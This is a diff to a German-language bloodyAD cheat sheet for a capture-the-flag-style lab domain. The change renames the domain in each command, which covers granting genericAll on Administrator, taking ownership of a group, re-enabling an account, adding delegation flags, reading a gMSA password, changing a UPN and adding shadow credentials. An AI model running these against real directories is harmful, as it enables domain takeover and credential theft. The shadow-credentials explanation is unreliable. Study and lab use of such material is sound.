@@ -72,7 +72,7 @@ bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' set password $target
 Gewährt dem Benutzer a.james volle Zugriffsrechte („genericAll“) auf das AD-Objekt „Administrator“. Dadurch kann a.james alle Eigenschaften und Berechtigungen des Administrator-Kontos ändern.
 "Füge der Access Control List (ACL) des Administrator-Objekts hinzu, dass a.james volle Rechte bekommt.“
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add genericAll "CN=Administrator,CN=Users,DC=puppy,DC=htb" a.james
+bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add genericAll "CN=Administrator,CN=Users,DC=b2syn,DC=htb" a.james
 ```
 
 <br>
@@ -81,7 +81,7 @@ bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add genericAll "CN=A
 
 Setzt den Besitzer des Active Directory-Objekts „DEVELOPERS“ auf den Benutzer a.james. Dadurch erhält a.james volle Kontrolle über dieses Objekt.
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' set owner "CN=DEVELOPERS,DC=puppy,DC=htb" a.james
+bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' set owner "CN=DEVELOPERS,DC=b2syn,DC=htb" a.james
 ```
 
 <br>
@@ -90,7 +90,7 @@ bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' set owner "CN=DEVELO
 
 Entfernt das ACCOUNTDISABLE-Flag im User-Account-Control (UAC) des Benutzers j.calvus, wodurch das Konto wieder aktiviert wird.
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' remove uac "CN=j.calvus,OU=Users,DC=puppy,DC=htb" -f ACCOUNTDISABLE
+bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' remove uac "CN=j.calvus,OU=Users,DC=b2syn,DC=htb" -f ACCOUNTDISABLE
 ```
 
 <br>
@@ -99,7 +99,7 @@ bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' remove uac "CN=j.cal
 
 Fügt dem Benutzerkonto service-account das UAC-Flag TRUSTED_TO_AUTH_FOR_DELEGATION hinzu. Dadurch wird das Konto für die vertrauenswürdige Delegierung autorisiert.
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add uac "CN=service-account,OU=Services,DC=puppy,DC=htb" -f TRUSTED_TO_AUTH_FOR_DELEGATION
+bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add uac "CN=service-account,OU=Services,DC=b2syn,DC=htb" -f TRUSTED_TO_AUTH_FOR_DELEGATION
 ```
 
 <br>
@@ -108,7 +108,7 @@ bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add uac "CN=service-
 
 Fragt das Active Directory-Objekt gmsa-web (Managed Service Account) ab und zeigt das Attribut msDS-ManagedPassword mit dem aktuellen verwalteten Passwort an.
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=gmsa-web,CN=Managed Service Accounts,DC=puppy,DC=htb" --attr msDS-ManagedPassword
+bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=gmsa-web,CN=Managed Service Accounts,DC=b2syn,DC=htb" --attr msDS-ManagedPassword
 ```
 <br>
 
@@ -116,8 +116,8 @@ bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=gmsa-
 Fragt beim Active Directory-Benutzer joerg das Attribut userPrincipalName ab und zeigt dessen Wert an.
 Ändert im Active Directory beim Benutzer joerg das Attribut userPrincipalName auf „joerg2@b2syn.htb“. Damit wird der Anmeldename des Nutzers angepasst.
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=joerg,OU=Users,DC=puppy,DC=htb" --attr userPrincipalName
-bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' set object "CN=joerg,OU=Users,DC=puppy,DC=htb" userPrincipalName -v "joerg2@b2syn.htb"
+bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=joerg,OU=Users,DC=b2syn,DC=htb" --attr userPrincipalName
+bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' set object "CN=joerg,OU=Users,DC=b2syn,DC=htb" userPrincipalName -v "joerg2@b2syn.htb"
 ```
 
 <br>
@@ -126,7 +126,7 @@ bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' set object "CN=joerg,OU
 
 Fügt dem AD-Benutzer joerg sogenannte Shadow Credentials hinzu, die alternative Anmeldedaten (z. B. für Azure AD Pass-Through Authentication) ermöglichen.
 ```zsh
-bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' add shadowCredentials "CN=joerg,OU=Users,DC=puppy,DC=htb"
+bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' add shadowCredentials "CN=joerg,OU=Users,DC=b2syn,DC=htb"
 ```
 
 
